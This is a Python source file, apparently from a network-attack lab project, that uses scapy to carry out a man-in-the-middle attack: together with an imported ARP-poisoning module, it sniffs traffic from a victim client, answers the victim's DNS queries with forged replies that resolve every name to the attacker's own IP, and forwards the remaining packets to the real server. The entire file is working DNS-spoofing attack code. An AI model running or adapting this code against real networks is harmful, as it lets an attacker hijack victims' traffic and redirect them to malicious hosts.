from scapy.all import *
from scapy.layers.inet import TCP, IP, ICMP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.l2 import *
import pcap
import help_functions
from log_helpers import *
from firewall import *
from arp_poison import client_ip, server_ip, local_ip


def get_man_in_middle_filter():
    return "(dst host {}) and (src host {})".format(server_ip, client_ip)


def get_man_in_the_middle_answer_filter():
    return "(dst host {}) and (src host {})".format(client_ip, server_ip)


def act_by_man_in_middle(pkt):
    """checking if pkt came from the target
     if its a dns request: returning custom response,
     else: forward pkt to destination"""

    pk = sniff(count=1, offline=pkt, filter=get_man_in_middle_filter())
    if pk:
        pk = pk[0]  # sniff returns a list, count=1 so only 1 pkt sniffed
        print("found packet from man in the middle target:")
        execute_one_command(pk, 5)  # print pkt
        if DNS in pk and pk[DNS].opcode == 0 and pk[DNS].ancount == 0:  # if found a query pkt unanswered
            send_custom_dns_response(pk)
        else:
            forward_pkt_to_server(pk)


def send_custom_dns_response(pk):
    """send custom dns response back to the target"""

    print("DNS query found, sending custom response.")
    spf_resp = IP(dst=pk[IP].src) \
        / UDP(dport=pk[UDP].sport, sport=53) \
        / DNS(id=pk[DNS].id, qr=1, ancount=1, an=DNSRR(rrname=pk[DNSQR].qname, rdata=local_ip)
              / DNSRR(rrname=pk["DNS Question Record"].qname, rdata=local_ip))

    print("sending this answer pkt:")
    spf_resp.show()
    send(spf_resp, verbose=0)


def forward_pkt_to_server(pk):
    """pass pkt destined to server"""

    server_mac = getmacbyip(server_ip)
    pk[Ether].dst = server_mac
    if ARP in pk:
        pk[ARP].hwdst = server_mac
    print("pk changed: ")
    pk.show()
    send(pk)
